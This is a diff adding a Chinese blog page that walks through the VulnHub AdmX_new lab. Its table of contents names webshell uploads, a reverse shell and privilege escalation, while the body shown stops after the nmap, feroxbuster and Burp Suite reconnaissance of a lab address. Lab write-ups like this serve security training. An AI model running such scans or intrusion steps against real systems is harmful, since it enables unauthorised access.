@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶机地址: https:&#x2F;&#x2F;download.vulnhub.com&#x2F;admx&#x2F;AdmX_new.7z难度等级: 中打靶目标: 取得 2 个 flag + root 权限">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-4-AdmX_new">
+<meta property="og:url" content="http://byesec.com/posts/338a9f9f.html">
+<meta property="og:site_name" content="patrik&#39;s blog">
+<meta property="og:description" content="靶机地址: https:&#x2F;&#x2F;download.vulnhub.com&#x2F;admx&#x2F;AdmX_new.7z难度等级: 中打靶目标: 取得 2 个 flag + root 权限">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091346386.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091944645.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092313209.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092452624.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117093525296.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117100907047.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117103351121.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117104819274.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113559581.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113614462.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105003629.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117110643947.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105845151.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117110717572.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117105722251.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113657009.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117113731381.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141137210.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141215930.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141334010.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141839492.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117141931382.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142333540.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142059793.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142554942.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142630478.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142653949.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117142901551.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143020914.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143051516.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117143209631.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144310167.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144328196.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144402379.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145344122.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145402436.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117144658121.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145600950.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117145845194.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150025521.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150443652.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150649101.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150806467.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117150904611.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152444377.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117152943835.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153006539.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153735618.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117153914865.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154514825.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154640760.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154804076.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117154929085.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155043263.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155135536.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155339940.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155440756.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155507429.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117155542610.png">
+<meta property="article:published_time" content="2022-01-05T01:05:46.000Z">
+<meta property="article:modified_time" content="2022-08-05T08:59:31.853Z">
+<meta property="article:author" content="patrik">
+<meta property="article:tag" content="靶机🎯">
+<meta property="article:tag" content="VulnHub🎯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091346386.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=48">
+          
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnHub-4-AdmX_new</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="patrik&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/855acbe9.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/4255005c.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/338a9f9f.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/338a9f9f.html&text=VulnHub-4-AdmX_new"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/338a9f9f.html&is_video=false&description=VulnHub-4-AdmX_new"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-4-AdmX_new&body=Check out this article: http://byesec.com/posts/338a9f9f.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/338a9f9f.html&title=VulnHub-4-AdmX_new"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/338a9f9f.html&name=VulnHub-4-AdmX_new&description=&lt;blockquote&gt;
+&lt;p&gt;靶机地址: &lt;a href=&#34;https://download.vulnhub.com/admx/AdmX_new.7z&#34;&gt;https://download.vulnhub.com/admx/AdmX_new.7z&lt;/a&gt;&lt;br&gt;难度等级: 中&lt;br&gt;打靶目标: 取得 2 个 flag + root 权限&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/338a9f9f.html&t=VulnHub-4-AdmX_new"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2.端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">3.端口服务信息扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%AE%BF%E9%97%AE10-0-2-11%E7%9A%8480%E7%AB%AF%E5%8F%A3%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.4.</span> <span class="toc-text">4.访问10.0.2.11的80端口页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8feroxbuster%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.5.</span> <span class="toc-text">5.使用feroxbuster目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%AE%BF%E9%97%AE%E5%8F%AF%E7%96%91%E7%9B%AE%E5%BD%95"><span class="toc-number">1.6.</span> <span class="toc-text">6.访问可疑目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E4%BD%BF%E7%94%A8Burpsuite%E5%AF%B9%E8%AE%BF%E9%97%AE%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">1.7.</span> <span class="toc-text">7.使用Burpsuite对访问页面的流量进行分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AF%B9%E9%A1%B5%E9%9D%A2%E9%87%8C%E7%9A%84%E9%93%BE%E6%8E%A5%E5%92%8C%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4%E7%AD%89%E4%BD%8D%E7%BD%AE%E5%B0%9D%E8%AF%95%E6%A3%80%E6%B5%8B"><span class="toc-number">2.1.</span> <span class="toc-text">1.对页面里的链接和表单提交等位置尝试检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AF%B9WordPress%E7%89%88%E6%9C%AC%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%89%BE"><span class="toc-number">2.2.</span> <span class="toc-text">2.对WordPress版本的漏洞进行查找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%94%E5%9B%9E%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="toc-number">2.3.</span> <span class="toc-text">3.返回查看目录扫描结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%AF%B9%E7%AE%A1%E7%90%86%E9%A1%B5%E9%9D%A2%E8%BF%9B%E8%A1%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">2.4.</span> <span class="toc-text">4.对管理页面进行密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-WordPress%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.5.</span> <span class="toc-text">5.WordPress后台漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1%E5%B0%9D%E8%AF%95%E5%9C%A8%E2%80%9C%E4%B8%BB%E9%A2%98%E2%80%9D%E6%8F%92%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E8%BF%9E%E6%8E%A5%E8%9A%81%E5%89%91"><span class="toc-number">2.5.1.</span> <span class="toc-text">5.1尝试在“主题”插入一句话木马连接蚁剑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2%E5%88%A9%E7%94%A8%E6%8F%92%E4%BB%B6%E4%B8%8A%E4%BC%A0webshell"><span class="toc-number">2.5.2.</span> <span class="toc-text">5.2利用插件上传webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#5-2-1%E4%B8%8A%E4%BC%A0%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BC%B9shell%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.5.2.1.</span> <span class="toc-text">5.2.1上传实现反弹shell连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-2-2-%E7%A1%AE%E8%AE%A4%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E4%B8%8A%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF-x2F-%E8%BD%AF%E4%BB%B6"><span class="toc-number">2.5.2.2.</span> <span class="toc-text">5.2.2 确认目标靶机上可利用的信息&#x2F;软件</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Kali%E7%9B%91%E5%90%AC4444%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.5.2.2.1.</span> <span class="toc-text">Kali监听4444端口</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E6%98%AF%E5%90%A6%E6%9C%89nc"><span class="toc-number">2.5.2.2.2.</span> <span class="toc-text">确定目标靶机是否有nc</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E6%98%AF%E5%90%A6%E6%9C%89Python%E7%8E%AF%E5%A2%83"><span class="toc-number">2.5.2.2.3.</span> <span class="toc-text">确定目标靶机是否有Python环境</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-2-3%E4%BD%BF%E7%94%A8python3%E5%8F%8D%E5%BC%B9shell%E4%BB%A3%E7%A0%81"><span class="toc-number">2.5.2.3.</span> <span class="toc-text">5.2.3使用python3反弹shell代码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3%E5%86%8D%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%9C%A8%E2%80%9C%E4%B8%BB%E9%A2%98%E2%80%9D%E6%8F%92%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.5.3.</span> <span class="toc-text">5.3再次尝试在“主题”插入一句话木马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">三、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B-x2F-etc-x2F-passwd"><span class="toc-number">3.1.</span> <span class="toc-text">1.查看&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E4%B8%BB%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%86%85%E6%98%AF%E5%90%A6%E6%9C%89%E8%AF%A5%E7%94%A8%E6%88%B7"><span class="toc-number">3.2.</span> <span class="toc-text">2.查看主目录文件内是否有该用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E6%A0%B8"><span class="toc-number">3.3.</span> <span class="toc-text">3.查看操作系统内核</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%9D%E8%AF%95%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9C%89%E6%B2%A1%E6%9C%89sudo%E6%9D%83%E9%99%90"><span class="toc-number">3.4.</span> <span class="toc-text">4.尝试查看当前用户有没有sudo权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8BWordPress%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">3.5.</span> <span class="toc-text">5.查看WordPress的配置文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%98%AF%E5%90%A6%E6%9C%89%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8%E7%9A%84%E5%8F%AF%E8%83%BD%E6%80%A7"><span class="toc-number">3.6.</span> <span class="toc-text">6.是否有密码复用的可能性?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%B0%9D%E8%AF%95%E7%99%BB%E5%BD%95%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7"><span class="toc-number">3.7.</span> <span class="toc-text">7.尝试登录数据库账号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%B0%9D%E8%AF%95%E6%98%AF%E5%90%A6%E5%A4%8D%E7%94%A8%E4%BA%86Web%E9%A1%B5%E9%9D%A2%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-number">3.8.</span> <span class="toc-text">8.尝试是否复用了Web页面的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BA%8C%E6%AC%A1%E6%8F%90%E6%9D%83"><span class="toc-number">3.9.</span> <span class="toc-text">9.二次提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E5%88%A9%E7%94%A8mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%80%A7"><span class="toc-number">3.10.</span> <span class="toc-text">10.利用mysql数据库特性</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnHub-4-AdmX_new
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">干脆面</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-05T01:05:46.000Z" class="dt-published" itemprop="datePublished">2022-01-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%F0%9F%94%90/">安全🔐</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VulnHub%F0%9F%8E%AF/" rel="tag">VulnHub🎯</a>, <a class="p-category" href="/tags/%E9%9D%B6%E6%9C%BA%F0%9F%8E%AF/" rel="tag">靶机🎯</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>靶机地址: <a target="_blank" rel="noopener" href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a><br>难度等级: 中<br>打靶目标: 取得 2 个 flag + root 权限</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091346386.png" alt="image-20211117091346386"></p>
+<h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.11</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117091944645.png" alt="image-20211117091944645"></p>
+<h3 id="3-端口服务信息扫描"><a href="#3-端口服务信息扫描" class="headerlink" title="3.端口服务信息扫描"></a>3.端口服务信息扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p80 10.0.2.11</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092313209.png" alt="image-20211117092313209"></p>
+<h3 id="4-访问10-0-2-11的80端口页面"><a href="#4-访问10-0-2-11的80端口页面" class="headerlink" title="4.访问10.0.2.11的80端口页面"></a>4.访问10.0.2.11的80端口页面</h3><p>访问：10.0.2.11:80</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117092452624.png" alt="image-20211117092452624"></p>
+<p>是Apache在Ubuntu下的默认页面，没有能够利用的信息</p>
+<h3 id="5-使用feroxbuster目录扫描"><a href="#5-使用feroxbuster目录扫描" class="headerlink" title="5.使用feroxbuster目录扫描"></a>5.使用feroxbuster目录扫描</h3><p>（字典：sudo apt install seclist   较大）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.11 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>扫描部分结果如下：</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117093525296.png" alt="image-20211117093525296"></p>
+<h3 id="6-访问可疑目录"><a href="#6-访问可疑目录" class="headerlink" title="6.访问可疑目录"></a>6.访问可疑目录</h3><p>访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a></p>
+<p>载入页面的过程长达5分钟，只能显示页面的部分信息，且一直处于加载中状态</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211117100907047.png" alt="image-20211117100907047"></p>
+<p>思考：一个WordPress的站点，究竟在访问过程中加载了什么？使得加载过程如此缓慢？</p>
+<h3 id="7-使用Burpsuite对访问页面的流量进行分析"><a href="#7-使用Burpsuite对访问页面的流量进行分析" class="headerlink" title="7.使用Burpsuite对访问页面的流量进行分析"></a>7.使用Burpsuite对访问页面的流量进行分析</h3><p>配置代理–OFF–访问<a target="_blank" rel="noopener" href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a> –HTTP history</p>
